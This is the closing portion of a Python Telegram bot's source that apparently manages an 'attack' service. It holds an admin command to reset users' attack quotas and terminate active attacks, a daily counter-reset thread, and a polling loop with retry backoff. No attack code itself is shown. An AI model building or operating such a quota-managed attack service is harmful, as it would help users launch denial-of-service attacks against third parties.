    if target_user_id in user_data:
        # Reset all user data
        user_data[target_user_id] = {
            'attacks': 0,
            'last_reset': datetime.datetime.now(),
            'last_attack': None,
            'attack_blocked_until': 0
        }
        save_users()
        
        # Clear any active attacks
        active_attacks.pop(target_user_id, None)
        pending_feedback.pop(target_user_id, None)
        pending_screenshot.pop(target_user_id, None)
        
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"🔄 USER RESET COMPLETE 🔄 ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 User ID: <code>{target_user_id}</code>\n"
            f"🔸 Attack count: Reset to 0\n"
            f"🔹 Block status: Cleared\n"
            f"🔸 Active attacks: Terminated")
    else:
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ❌ USER NOT FOUND ❌ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 User ID: <code>{target_user_id}</code>\n"
            f"🔸 No data exists for this user")

def auto_reset():
    """Reset attack counters daily"""
    while True:
        now = datetime.datetime.now()
        for user_id, data in list(user_data.items()):
            if (now - data['last_reset']).days >= 1:
                data['attacks'] = 0
                data['last_reset'] = now
                data['attack_blocked_until'] = 0
                save_users()
                logger.info(f"Reset attack counter for user {user_id}")
        time.sleep(86400)  # Sleep for 1 day

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🏁 START THE BOT 🏁
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if __name__ == "__main__":
    load_users()
    threading.Thread(target=auto_reset, daemon=True).start()
    
    print("""
    ╔════════════════════════════════╗
    ║       BOT STARTED SUCCESS      ║
    ╚════════════════════════════════╝
    """)
    logger.info("Bot starting...")
    
    retry_count = 0
    MAX_RETRIES = 5
    
    while True:
        try:
            bot.polling(none_stop=True, interval=3, timeout=20)
            retry_count = 0
        except Exception as e:
            retry_count += 1
            if retry_count > MAX_RETRIES:
                logger.error(f"Max retries reached. Restarting...")
                retry_count = 0
                
            wait_time = min(2 ** retry_count, 60)
            logger.error(f"Polling error: {e}\nRetrying in {wait_time} seconds...")
            time.sleep(wait_time)
            
            
            
            



